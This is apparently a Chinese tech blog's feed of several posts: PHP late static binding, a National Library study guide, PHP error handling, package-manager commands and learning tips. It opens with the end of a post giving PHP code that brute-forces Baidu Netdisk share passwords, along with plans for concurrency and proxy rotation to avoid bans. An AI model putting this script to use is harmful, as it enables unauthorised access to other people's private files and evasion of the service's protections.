class="line">    ];</span><br><span class="line"></span><br><span class="line">    $requestUrl = $baseUrl.http_build_query($get_params);</span><br><span class="line"></span><br><span class="line">    $pwd = <span class="string">'77wk'</span>;<span class="comment">//todo 生成密码</span></span><br><span class="line">    $post_params = [</span><br><span class="line">        <span class="string">'pwd'</span> =&gt; $pwd,</span><br><span class="line">        <span class="string">'vscode'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'vscode_str'</span> =&gt; <span class="string">''</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $ch = curl_init($requestUrl);</span><br><span class="line">    curl_setopt_array(</span><br><span class="line">        $ch,</span><br><span class="line">        [</span><br><span class="line">            CURLOPT_POST =&gt; <span class="keyword">true</span>,</span><br><span class="line">            CURLOPT_POSTFIELDS =&gt; http_build_query($post_params),<span class="comment">//设定 POST 参数内容</span></span><br><span class="line">            <span class="comment">// CURLOPT_FOLLOWLOCATION =&gt; true,//跟随重定向地址</span></span><br><span class="line">            <span class="comment">// CURLOPT_AUTOREFERER =&gt; true,</span></span><br><span class="line">            CURLOPT_RETURNTRANSFER =&gt; <span class="keyword">true</span>,<span class="comment">//将curl_exec()获取的信息以字符串返回，而不是直接输出。</span></span><br><span class="line">            CURLOPT_USERAGENT =&gt; <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'</span>,</span><br><span class="line">            CURLOPT_REFERER =&gt; <span class="string">'https://pan.baidu.com/share/init?surl='</span>.$shareCode<span class="comment">//必填项</span></span><br><span class="line">        ]</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//todo 并发请求</span></span><br><span class="line">    $response = curl_exec($ch);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(! json_decode($response)-&gt;errno) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'破解成功，密码为：'</span>.$pwd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">crackBaiduNetdiskPwd(<span class="string">'https://pan.baidu.com/s/1gftmNyb'</span>);</span><br></pre></td></tr></table></figure><p>至此，单次请求已经成功，但剩余的工作还有：</p><ol><li>我们需要生成纯字母、字母数字、纯数字三种类型的密码，且这三类的权重依次降低，三类中的重复密码（如：<code>aaaa</code>，<code>6666</code>）权重最低</li><li>给定密码区间段和类型，如何生成指定长度的密码，如，怎样生成<code>aaaa ~ zzzz</code>的密码？（现有思路：将字母转换为 ASCII 对应的数字，共 4 个位，将其转换为数组。如果第0位值达到<code>z</code>，则向高位进位，低位归位处理）</li><li>php 实现并发请求</li><li>添加IP代理，避免单一IP请求被封禁</li><li>添加日志，支持断点续破</li><li>记录每次破解的耗时与次数，用于后期分析</li></ol><p>—2019-09-19更新—</p><p>生成<code>aaaa ~ zzzz</code>的密码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAlphabet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="string">'aaaa'</span>; $i &lt; <span class="string">'zzzz'</span>; $i++) &#123;</span><br><span class="line">        <span class="keyword">yield</span> $i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">'zzzy'</span> === $i) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">yield</span> get4Z();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get4Z</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'zzzz'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (getAlphabet() <span class="keyword">as</span> $letter) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $letter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成字母数字的密码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAlphanumeric</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//todo </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><ol><li>如果需要获取更高精度的时间戳，可以调整<code>php.ini</code>中的<code>precision</code>的值。</li><li><code>curl_setopt_array</code>中的 key 是预设常量，如果写作字符串（如<code>&#39;CURLOPT_POSTFIELDS&#39;</code>），则会有<code>curl_setopt_array(): Array keys must be CURLOPT constants or equivalent integer values in</code>的错误</li></ol>]]></content>
      
      
      <categories>
          
          <category> 软件编程 </category>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【转】对PHP后期静态绑定的理解</title>
      <link href="/post/late-static-binding/"/>
      <url>/post/late-static-binding/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8clz2qre3j30jg0b5q59.jpg" alt=""></p><a id="more"></a><h1 id="什么是后期静态绑定"><a href="#什么是后期静态绑定" class="headerlink" title="什么是后期静态绑定"></a>什么是后期静态绑定</h1><p>在看一些框架源码或者是某个项目的代码时，经常能看到后期静态绑定的用法，比如下面这段：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">static</span>::$instance)) &#123;</span><br><span class="line">        <span class="keyword">static</span>::$instance = <span class="keyword">new</span> <span class="keyword">static</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">static</span>::$instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用到的就是后期静态绑定。那么，什么是后期静态绑定？</p><p>“后期绑定” 的意思是说，<code>static::</code>不再被解析为定义当前方法所在的类，而是在运行时计算的。这里要先说两个概念，一个是转发调用，另一个是非转发调用。</p><ul><li><p>转发调用<br>所谓的 “转发调用”（forwarding call）指的是通过以下几种方式进行的静态调用：<code>self::</code>, <code>parent::</code>, <a href="https://www.php.net/manual/zh/language.oop5.static.php" target="_blank" rel="noopener"><code>static::</code></a> 以及 <a href="https://www.php.net/manual/zh/function.forward-static-call.php" target="_blank" rel="noopener"><code>forward_ static _call()</code></a>。即<strong>在进行静态调用时未指明类名的调用属于转发调用</strong>。</p></li><li><p>非转发调用<br>非转发调用其实就是明确指定类名的静态调用（<code>foo::bar()</code>）和非静态调用 (<code>$foo-&gt;bar()</code>)。即<strong>明确地指定类名的静态调用和非静态调用</strong>。</p></li></ul><p>顾名思义，<strong>非转发调用前面有类名所以调用的函数一定是属于 “这个类的”，不需要转到别的类。转发调用就是由于前期的静态绑定导致在后面调用静态方法时可能 “转发到其他的类”</strong></p><p>在 PHP 的官方文档里，对于后期静态绑定是这样说的：后期静态绑定工作原理是存储了在上一个 “非转发调用”（non-forwarding call）中的类名。意思是<strong>当我们调用一个转发调用的静态调用时，实际调用的类是上一个非转发调用的类</strong>。</p><p>来看两个例子：</p><p>例子1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">who</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">static</span>::who(); <span class="comment">// 后期静态绑定从这里开始</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">who</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">B::test();</span><br></pre></td></tr></table></figure><p>以上代码会输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><p>例子2：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">static</span>::who();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">who</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        A::foo();</span><br><span class="line">        <span class="keyword">parent</span>::foo();</span><br><span class="line">        <span class="keyword">self</span>::foo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">who</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">who</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">C::test();</span><br></pre></td></tr></table></figure><p>以上代码会输出</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">A</span></span><br><span class="line">C</span><br><span class="line">C</span><br></pre></td></tr></table></figure><p>在这里主要分析下例 2。</p><ol><li><code>C::test()</code>，这是一个非转发调用，因为：：前面有类名 C。</li><li>进入 <code>test()</code> 方法，有三个静态调用 <code>A::foo()</code>,<code>parent::foo()</code>,<code>self::foo()</code>, 对于这三个静态调用来说，他们的非转发调用类就是 C。</li><li>现在执行 <code>A::foo()</code>, 这是一个非转发调用。<code>A::foo()</code> 中的代码是 <code>static::who()</code>, 这是一个转发调用，对于这个转发调用来说他的非转发调用类就是不再是 C 而是 A（因为之前执行了 <code>A::foo()</code>）。因此执行的结果为 A</li><li>现在执行 <code>parent::foo()</code>, 这是一个转发调用，转发到哪里呢？就是它的上一个非转发调用的类，也就是类 C（在步骤 2 中提到的）。在这里一定要注意虽然在这之前执行了 <code>A::foo()</code>, 但是 <code>parent::foo()</code> 的上一个非转发调用的类任然是类 C。因此执行的结果是 C.</li><li>现在执行 <code>self::foo()</code>, 这个和 <code>parent::foo()</code> 一样都是转发调用，因此也输出 C。</li></ol><blockquote><p>想要搞清楚后期静态绑定，就是要知道 <code>static</code> 是哪个类。</p></blockquote><h1 id="使用后期静态绑定的好处"><a href="#使用后期静态绑定的好处" class="headerlink" title="使用后期静态绑定的好处"></a>使用后期静态绑定的好处</h1><p>后期静态绑定目前我看到较多的是用于对象实例化中，在实例化对象时，<code>static</code> 会根据运行时调用的类来决定实例化对象，而 <code>self</code> 则是根据所在位置的类来决定实例化对象。当我们只想实例化子类，并且不希望后续在对子类的使用中由于父类的变化对子类产生影响时，后期静态绑定就能发挥它的作用了。</p>]]></content>
      
      
      <categories>
          
          <category> 软件编程 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>国家图书馆自习不完全指南</title>
      <link href="/post/the-national-library-guide/"/>
      <url>/post/the-national-library-guide/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87clzenr2j30ph0cw0y0.jpg" alt=""></p><a id="more"></a><p>无论是工作之余充电，还是赶制论文，国家图书馆都是一个非常好的选择，一方面是有很多免费的自习空位，另一方面在这样的氛围中容易集中注意力、高效学习，最重要的是，借阅区的书籍只要不带出馆区，都可以免费借阅。但国图也有一些缺点：比如免费 WiFi 由于使用人数较多，速度非常慢，所以如果你非常依赖网络，建议使用手机热点。</p><h1 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h1><p>地铁 4 号线国家图书馆站，毗邻动物园。</p><h1 id="开放时间"><a href="#开放时间" class="headerlink" title="开放时间"></a>开放时间</h1><p>总馆北区：周一至周五9：00–21：00，周六和周日9：00–17：00<br>古籍馆：周一至周五9：00–17：00<br>少年儿童馆：周一至周日9：00–17：00 （北区一层东侧）</p><blockquote><p>相比于火爆的北区，古籍馆相对冷清许多。北区 10 点多到可能就找不到插座能用的座位了，而且中午吃完饭回来座位还可能被占，但古籍馆一整天都会有空位，而且自习的人相对较少，也更加的安静</p></blockquote><h1 id="存取包"><a href="#存取包" class="headerlink" title="存取包"></a>存取包</h1><p>国图不允许携带自己的图书与书包进入，可以在存包处将书包存好。如果携带了电脑，则需更换网兜。</p><h1 id="出入须知"><a href="#出入须知" class="headerlink" title="出入须知"></a>出入须知</h1><p>每次出入均需刷身份证或者读者卡</p><h1 id="关于借阅"><a href="#关于借阅" class="headerlink" title="关于借阅"></a>关于借阅</h1><ol><li>借阅前须办理读者证并缴纳押金，中文图书 100 元，外文图书 1000 元。</li><li>如需查询借阅图书状态与位置，可在馆内的开放计算机查询，或者在 <a href="http://opac.nlc.cn/F?RN=737257934" target="_blank" rel="noopener">http://opac.nlc.cn/F?RN=737257934</a> 查询</li><li>但国图借书的人实在是太多了，我之前想借的基本书，一直都是外借状态，后来就放弃退押金了</li></ol><h1 id="关于吃饭"><a href="#关于吃饭" class="headerlink" title="关于吃饭"></a>关于吃饭</h1><p>国图附近餐厅较少，没有太多的选择，北区背后有家国图小馆，价格味道都还可以，我经常去。</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP也有Day</title>
      <link href="/post/php-has-day/"/>
      <url>/post/php-has-day/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006tNc79ly1g4rr5qi6qxj3097064t8y.jpg" alt=""></p><a id="more"></a><h1 id="1-精通-PHP-錯誤處理，讓除錯更自在"><a href="#1-精通-PHP-錯誤處理，讓除錯更自在" class="headerlink" title="1. 精通 PHP 錯誤處理，讓除錯更自在"></a>1. <a href="https://www.youtube.com/watch?v=QYjklJz5ed0&list" target="_blank" rel="noopener">精通 PHP 錯誤處理，讓除錯更自在</a></h1><p>PHP错误设定</p><ul><li>PHP 预设为<code>E_ALL &amp; ~E_NOTICE</code>，即显示除 Notice 外的所有错误</li><li>在开发过程中，建议将错误级别设置为 E_ALL 或 -1，开发者应该处理所有可能的 Warning &amp; Notice，不要让任何可能的 Bug 有机会出现。</li><li>老旧系统运行时，可以考虑设置为 0，避免用户看到大量的 Notice信息。</li><li>生产环境中，可以设置为 0，但将所有重要错误记录进 log。</li></ul><p><code>set_error_handler()</code> 方法可以自定义错误处理，该方法会覆盖系统的标准错误处理。<br><code>error_log()</code> 可用于记录执行的错误信息</p><p>可以使用 <a href="https://github.com/Seldaek/monolog" target="_blank" rel="noopener">Monolog</a> 来管理日志信息。<br>如果公司采用微服务，可以考虑将单台服务器用作日志服务器，以免日志空间不足。</p><p>PHP 7的 Exceptions<br><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4rqg01lb0j30nf0h9dh4.jpg" alt="PHP 7的 Exceptions"></p><p>异常状况的处理示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($jobs <span class="keyword">as</span> $job) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Queue::process($job);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (QueueException $e) &#123;</span><br><span class="line">        Mailer::send(<span class="string">'A queue job error'</span>, $message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 软件编程 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各系统包管理工具及常用系统命令</title>
      <link href="/post/package-managment-tools/"/>
      <url>/post/package-managment-tools/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8cm0hhup6j308c06c0st.jpg" alt=""></p><p>常见包管理工具总结</p><a id="more"></a><h1 id="macOS-之-Homebrew"><a href="#macOS-之-Homebrew" class="headerlink" title="macOS 之 Homebrew"></a>macOS 之 Homebrew</h1><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td><code>brew search &lt;package-name&gt;</code></td><td>搜索软件</td></tr><tr><td><code>brew install &lt;package-name&gt;</code></td><td>安装软件</td></tr><tr><td><code>brew uninstall &lt;package-name&gt;</code></td><td>卸载软件</td></tr><tr><td><code>brew list</code></td><td>列出已安装软件</td></tr><tr><td><code>brew info &lt;package-name&gt;</code></td><td>显示软件信息，包括版本信息、依赖信息、启动命令等</td></tr><tr><td><code>brew outdated</code></td><td>检查可更新软件</td></tr><tr><td><code>brew update</code></td><td>更新待更新的软件</td></tr><tr><td><code>brew cleanup</code></td><td>清理软件安装包</td></tr><tr><td><code>brew services list</code></td><td>查看brew安装软件的开机启动项</td></tr><tr><td><code>brew services cleanup</code></td><td>清除无效的开机启动项</td></tr><tr><td><code>brew switch &lt;package-name&gt; &lt;version&gt;</code></td><td>切换同一软件的不同版本</td></tr><tr><td><code>brew doctor</code></td><td>查看是否有软件配置异常</td></tr></tbody></table><h1 id="macOS-之-Homebrew-Cask"><a href="#macOS-之-Homebrew-Cask" class="headerlink" title="macOS 之 Homebrew Cask"></a>macOS 之 Homebrew Cask</h1><p>Homebrew Cask 是一个类似于 App Store 的终端软件安装工具，命令与 <code>brew</code> 相似，其常用命令如下：</p><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td><code>brew cask search &lt;app-name&gt;</code></td><td>搜索软件</td></tr><tr><td><code>brew cask install &lt;app1&gt; &lt;app2&gt; ...</code></td><td>安装软件</td></tr><tr><td><code>brew cask uninstall &lt;app1&gt; &lt;app2&gt; ...</code></td><td>卸载软件</td></tr><tr><td><code>brew cask info &lt;app-name&gt;</code></td><td>查看软件信息</td></tr><tr><td><code>brwe cask list</code></td><td>列出已安装软件</td></tr></tbody></table><h1 id="CentOS-之-yum"><a href="#CentOS-之-yum" class="headerlink" title="CentOS 之 yum"></a>CentOS 之 yum</h1><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td><code>yum search &lt;package-name&gt;</code></td><td>搜索软件包</td></tr><tr><td><code>yum install &lt;package-name&gt;</code></td><td>安装软件</td></tr><tr><td><code>yum remove &lt;package-name&gt;</code></td><td>卸载软件</td></tr><tr><td><code>yum update &lt;package-name&gt;</code></td><td>更新软件</td></tr><tr><td><code>yum check-update</code></td><td>检查可更新软件</td></tr><tr><td><code>yum provides &lt;command&gt;</code></td><td>查看支持某个命令的包</td></tr></tbody></table><h1 id="Ubuntu-Debian-之-apt"><a href="#Ubuntu-Debian-之-apt" class="headerlink" title="Ubuntu/Debian 之 apt"></a>Ubuntu/Debian 之 apt</h1><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td><code>apt search &lt;package-name&gt;</code></td><td>搜索软件包</td></tr><tr><td><code>apt install &lt;package-name&gt;</code></td><td>安装软件</td></tr><tr><td><code>apt remove &lt;package-name&gt;</code></td><td>卸载软件</td></tr><tr><td><code>apt info &lt;package-name&gt;</code></td><td>查看软件信息</td></tr><tr><td><code>apt update</code></td><td>更新软件</td></tr><tr><td><code>apt list --upgradeable</code></td><td>检查可更新软件</td></tr><tr><td><code>apt list --installed</code></td><td>列出已安装软件</td></tr><tr><td><code>apt upgrade</code></td><td>升级软件</td></tr><tr><td><code>apt autoclean</code></td><td>删除所有软件缓存</td></tr><tr><td><code>apt autoremove</code></td><td>删除系统不再使用的孤立软件</td></tr></tbody></table><h1 id="CentOS-之-systemctl"><a href="#CentOS-之-systemctl" class="headerlink" title="CentOS 之 systemctl"></a>CentOS 之 systemctl</h1><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td><code>systemctl list-unit-files</code></td><td>列出所有可用服务</td></tr><tr><td><code>systemctl list-units</code></td><td>列出所有运行中的服务</td></tr><tr><td><code>systemctl --failed</code></td><td>列出所有失败的服务</td></tr><tr><td>systemctl list-unit-files &#124; grep enable</td><td>查看自启动的软件</td></tr><tr><td><code>systemctl is-enabled &lt;service-name&gt;</code></td><td>查看某个服务是否开机启动</td></tr><tr><td><code>systemctl status &lt;service-name&gt;</code></td><td>查看服务状态</td></tr><tr><td><code>systemctl start &lt;service-name&gt;</code></td><td>启动某个服务</td></tr><tr><td><code>systemctl restart &lt;service-name&gt;</code></td><td>重启某个服务</td></tr><tr><td><code>systemctl stop &lt;service-name&gt;</code></td><td>停止某个服务</td></tr><tr><td><code>systemctl daemon-reload</code></td><td>重载服务配置文件</td></tr><tr><td><code>systemctl reload &lt;service-name&gt;</code></td><td>重载服务</td></tr><tr><td><code>systemctl enable &lt;service-name&gt;</code></td><td>设置开机自启动</td></tr><tr><td><code>systemctl disable &lt;service-name&gt;</code></td><td>关闭开机自启动</td></tr><tr><td><code>systemctl kill &lt;service-name&gt;</code></td><td>杀死服务</td></tr></tbody></table><p>Systemd 设置示例</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line"><span class="attribute">Description</span>=Laravel<span class="built_in"> queue </span>worker</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line"><span class="attribute">User</span>=www-data</span><br><span class="line"><span class="attribute">Group</span>=www-data</span><br><span class="line"><span class="attribute">Restart</span>=on-failure</span><br><span class="line"><span class="attribute">ExecStart</span>=/usr/bin/php/path/to/laravel/artisan queue:work <span class="attribute">--sleep</span>=3 <span class="attribute">--tries</span>=3</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line"><span class="attribute">WantedBy</span>=multi-user.target</span><br></pre></td></tr></table></figure><h1 id="Ubuntu-Debian-之-supervisorctl"><a href="#Ubuntu-Debian-之-supervisorctl" class="headerlink" title="Ubuntu/Debian 之 supervisorctl"></a>Ubuntu/Debian 之 supervisorctl</h1><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td><code>supervisorctl start &lt;service-name&gt;</code></td><td>启动服务</td></tr><tr><td><code>supervisorctl stop &lt;service-name&gt;</code></td><td>停止服务</td></tr><tr><td><code>supervisorctl restart &lt;service-name&gt;</code></td><td>重启服务</td></tr><tr><td><code>supervisorctl status &lt;service-name&gt;</code></td><td>查看服务状态</td></tr><tr><td><code>supervisorctl update</code></td><td>更新服务</td></tr></tbody></table><p>Supervisord 设置示例</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[program:laravel-worker]</span><br><span class="line">process_ <span class="attribute">name</span>=%(program_name)s_%(processnum)02d</span><br><span class="line"><span class="attribute">command</span>=/usr/bin/php/path/to/laravel/artisan <span class="attribute">--sleep</span>=3 <span class="attribute">--tries</span>=3</span><br><span class="line"><span class="attribute">autostart</span>=<span class="literal">true</span></span><br><span class="line"><span class="attribute">autorestart</span>=<span class="literal">true</span></span><br><span class="line"><span class="attribute">user</span>=www</span><br><span class="line"><span class="attribute">numprocs</span>=8</span><br><span class="line">redirect_ <span class="attribute">stderr</span>=<span class="literal">true</span></span><br><span class="line"><span class="attribute">stdout_logfile</span>=/var/www/html/storage/logs/worker.log</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 软件编程 </category>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>编程学习方法</title>
      <link href="/post/how-to-learn-programming/"/>
      <url>/post/how-to-learn-programming/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87codalcgj319i0h2jt4.jpg" alt=""></p><p>一天很长，一生很短。</p><a id="more"></a><ol><li>不断练习<br>Learn by doing!</li><li>官方文档<br>快速、准确、高效</li><li>O’Reilly 等经典书籍<br>体系化知识，行业大牛多年经验，站在巨人的肩膀上。</li><li>GitHub<br>优秀开源项目让你事半功倍<br>GitHub Trending 让你了解当前行业热点</li><li>Google<br>你所遇到的 99% 的问题 Google 都知道答案</li><li>YouTube<br>来自世界各地的视频教程与分享</li><li>Stack Overflow<br>高效解决问题</li><li>Hacker News<br>来自全球的行业最新资讯</li><li>reddit<br>互联网首页</li></ol>]]></content>
      
      
      <categories>
          
          <category> 软件编程 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>树莓派从零安装 Docker</title>
      <link href="/post/install-docker-on-pi/"/>
      <url>/post/install-docker-on-pi/</url>
      
